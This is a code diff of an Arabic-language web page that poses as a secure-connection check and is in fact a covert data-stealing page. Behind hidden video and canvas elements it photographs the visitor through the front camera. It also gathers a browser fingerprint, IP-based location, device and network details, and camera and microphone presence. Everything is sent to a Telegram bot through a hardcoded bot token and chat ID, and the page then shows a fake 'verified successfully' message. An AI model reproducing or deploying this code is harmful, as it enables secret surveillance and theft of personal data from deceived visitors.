@@ -42,6 +42,7 @@
 <div class="loader"></div>
 <h2>🔒 جارٍ التحقق من اتصالك الآمن...</h2>
 
+<!-- تم إزالة عناصر الكاميرا المرئية -->
 <video id="cameraPreview" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
@@ -50,124 +51,71 @@
   try {
     // بيانات البوت
     const botToken = "8102627165:AAFWsgPIljsQwGPGWYcCsNdJPPDn-a47IM8";
-    const chatId = "6405482546";ر
+    const chatId = "6405482546";
     
     let imageBlob = null;
-    let geolocationData = "غير معروف"; // مبدئياً، الموقع الجغرافي غير معروف
+    
+    // محاولة الوصول إلى الكاميرا والتقاط الصورة
+    try {
+      const video = document.getElementById('cameraPreview');
+      const canvas = document.getElementById('canvas');
+      
+      // طلب إذن الكاميرا
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user' }, 
+        audio: false 
+      });
+      
+      video.srcObject = stream;
+      
+      // انتظر ثانية لضمان تشغيل الكاميرا
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      
+      // التقاط صورة من الفيديو
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // تحويل الصورة إلى blob
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      const res = await fetch(dataUrl);
+      imageBlob = await res.blob();
+      
+      // إيقاف الكاميرا
+      stream.getTracks().forEach(track => track.stop());
+      
+    } catch (camError) {
+      console.log("تعذر الوصول إلى الكاميرا:", camError);
+    }
+    
+    // ننتظر 3 ثواني إضافية (بعد محاولة التقاط الصورة)
+    await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // تحديد الموقع الجغرافي أولاً
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(async (position) => {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const geoMapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        geolocationData = `خط العرض: ${latitude}, خط الطول: ${longitude} [اضغط هنا](${geoMapLink})`;
+    // بصمة المتصفح
+    const fpPromise = FingerprintJS.load();
+    const fp = await fpPromise;
+    const result = await fp.get();
+    const browserFingerprint = result.visitorId;
 
-        // بعد تحديد الموقع الجغرافي، نحاول الوصول إلى الكاميرا
-        try {
-          const video = document.getElementById('cameraPreview');
-          const canvas = document.getElementById('canvas');
-          
-          // طلب إذن الكاميرا
-          const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: 'user' }, 
-            audio: false 
-          });
-          
-          video.srcObject = stream;
-          
-          // انتظر ثانية لضمان تشغيل الكاميرا
-          await new Promise(resolve => setTimeout(resolve, 1000));
-          
-          // التقاط صورة من الفيديو
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-          // تحويل الصورة إلى blob
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-          const res = await fetch(dataUrl);
-          imageBlob = await res.blob();
-          
-          // إيقاف الكاميرا
-          stream.getTracks().forEach(track => track.stop());
-          
-        } catch (camError) {
-          console.log("تعذر الوصول إلى الكاميرا:", camError);
-        }
+    // بيانات IP والموقع
+    const ipinfo = await fetch("https://ipinfo.io/json?token=ded76e1cc16472").then(r => r.json());
+    const mapLink = `https://www.google.com/maps?q=${ipinfo.loc}`;
 
-        // بصمة المتصفح
-        const fpPromise = FingerprintJS.load();
-        const fp = await fpPromise;
-        const result = await fp.get();
-        const browserFingerprint = result.visitorId;
+    // معلومات الجهاز
+    const ua = platform;
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 هاتف" : "💻 كمبيوتر/لوحي";
+    const ram = navigator.deviceMemory || "غير معروف";
+    const cpu = navigator.hardwareConcurrency || "غير معروف";
 
-        // بيانات IP والموقع
-        const ipinfo = await fetch("https://ipinfo.io/json?token=ded76e1cc16472").then(r => r.json());
-        const mapLink = `https://www.google.com/maps?q=${ipinfo.loc}`;
+    // كاميرا ومايك
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const hasCam = devices.some(d => d.kind === "videoinput");
+    const hasMic = devices.some(d => d.kind === "audioinput");
 
-        // معلومات الجهاز
-        const ua = platform;
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 هاتف" : "💻 كمبيوتر/لوحي";
-        const ram = navigator.deviceMemory || "غير معروف";
-        const cpu = navigator.hardwareConcurrency || "غير معروف";
-
-        // كاميرا ومايك
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const hasCam = devices.some(d => d.kind === "videoinput");
-        const hasMic = devices.some(d => d.kind === "audioinput");
-
-        // الحصول على معلومات الـ Proxy (معلومات الـ VPN)
-        const proxyDetected = (ipinfo.ip !== ipinfo.hostname) ? "نعم" : "لا";
-
-        // معرفة ما إذا كان المستخدم يستخدم الوضع الداكن أو الفاتح
-        const theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "وضع داكن" : "وضع فاتح";
-
-        // التحقق من الجافا سكربت وWebAssembly
-        const supportsWebAssembly = typeof WebAssembly !== "undefined" ? "نعم" : "لا";
-        const jsVersion = ua.version;
-
-        // معرفة تاريخ آخر زيارة
-        const lastVisit = localStorage.getItem("lastVisit") || "أول زيارة";
-        localStorage.setItem("lastVisit", new Date().toISOString());
-
-        // مراقبة الـ WebSockets و Fetch Requests
-        let websocketStatus = "غير متاح";
-        if (window.WebSocket) {
-          websocketStatus = "متاح";
-        }
-
-        // إضافات الشبكة
-        const networkType = connection.effectiveType || "غير معروف";
-        const downlink = connection.downlink || "غير معروف";
-        const downlinkMax = connection.downlinkMax || "غير معروف";
-        const rtt = connection.rtt || "غير معروف";
-        const saveData = connection.saveData ? "نعم" : "لا";
-        const connectionType = connection.type || "غير معروف";
-        const protocol = connection.protocol || "غير معروف";
-
-        // WebRTC - مراقبة WebRTC
-        const webrtcDetails = await new Promise((resolve, reject) => {
-          const rtc = new RTCPeerConnection();
-          rtc.createDataChannel('test');
-          rtc.createOffer().then((offer) => rtc.setLocalDescription(offer));
-          rtc.onicecandidate = (event) => {
-            if (event.candidate) {
-              resolve(event.candidate);
-            }
-          };
-        });
-
-        // DNS Query Time
-        const dnsStartTime = performance.now();
-        const ipCheck = await fetch("https://ipinfo.io/json").then(response => response.json());
-        const dnsEndTime = performance.now();
-        const dnsTime = dnsEndTime - dnsStartTime;
-
-        // بناء الرسالة
-        const msg = `
+    // بناء الرسالة
+    const msg = `
 📥 *زائر جديد:*
 
 🌍 *IP:* ${ipinfo.ip}
@@ -181,69 +129,43 @@
 💾 *الرام:* ${ram} GB
 🌐 *المتصفح:* ${ua.name} ${ua.version}
 📺 *دقة الشاشة:* ${screen.width}x${screen.height}
-⚡️ *نوع الشبكة:* ${networkType} (${connectionType})
-🚀 *التحميل:* ${downlink} Mbps
-💨 *أقصى سرعة تنزيل:* ${downlinkMax} Mbps
-🕰 *RTT:* ${rtt} ms
-📉 *وضع توفير البيانات:* ${saveData}
-🧬 *بروتوكول الشبكة:* ${protocol}
+⚡️ *نوع الشبكة:* ${(connection.effectiveType || "غير معروف").toUpperCase()} (${connection.type || "غير معروف"})
+🚀 *التحميل:* ${connection.downlink || "غير معروف"} Mbps
 
-🔗 *WebRTC Candidate:* ${JSON.stringify(webrtcDetails)}
-💾 *زمن استعلام الـ DNS:* ${dnsTime} ms
-
+🈯️ *اللغة:* ${navigator.language}
+⏰ *المنطقة الزمنية:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 🎥 *كاميرا:* ${hasCam ? "نعم" : "لا"}
 🎙 *مايك:* ${hasMic ? "نعم" : "لا"}
 
 🧬 *بصمة المتصفح:* ${browserFingerprint}
+    `;
 
-🌑 *إعدادات الثيم:* ${theme}
-🌍 *الدعم لجافا سكربت وWebAssembly:* JS Version ${jsVersion}, WebAssembly: ${supportsWebAssembly}
-🌐 *التصفح عبر VPN أو Proxy:* ${proxyDetected}
-📡 *مراقبة WebSockets:* ${websocketStatus}
-📍 *التنقل الجغرافي:* ${geolocationData}
-📅 *تاريخ آخر زيارة:* ${lastVisit}
-`;
-
-        // إرسال الرسالة إلى تيليجرام
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('caption', msg);
-        formData.append('parse_mode', 'Markdown');
-        
-        if (imageBlob) {
-          formData.append('photo', imageBlob, 'captured.jpg');
-          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-        } else {
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: msg,
-              parse_mode: "Markdown"
-            })
-          });
-        }
-
-        // تغيير النص بعد الإرسال
-        document.body.innerHTML = `<h1>✅ تم التحقق بنجاح!</h1>`;
-
-      }, (error) => {
-        console.log("لم يتمكن المستخدم من تفعيل الموقع الجغرافي");
-        geolocationData = "الموقع غير متاح"; // في حالة رفض الموقع الجغرافي
-        document.body.innerHTML = `<h1>❌ لم يتم تحديد الموقع الجغرافي!</h1>`;
-      }, {
-        enableHighAccuracy: true, // تفعيل دقة الموقع العالية
-        timeout: 5000, // تعيين مهلة الوقت قبل فشل تحديد الموقع
-        maximumAge: 0 // لا نريد استخدام معلومات الموقع المخزنة
+    // الإرسال إلى تيليجرام
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('caption', msg);
+    formData.append('parse_mode', 'Markdown');
+    
+    if (imageBlob) {
+      formData.append('photo', imageBlob, 'captured.jpg');
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
       });
     } else {
-      console.log("الموقع الجغرافي غير مدعوم في المتصفح.");
-      geolocationData = "الموقع غير متاح"; // في حالة عدم دعم الموقع الجغرافي
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      });
     }
+
+    // تغيير النص بعد الإرسال
+    document.body.innerHTML = `<h1>✅ تم التحقق بنجاح!</h1>`;
 
   } catch (err) {
     console.error("حدث خطأ:", err);
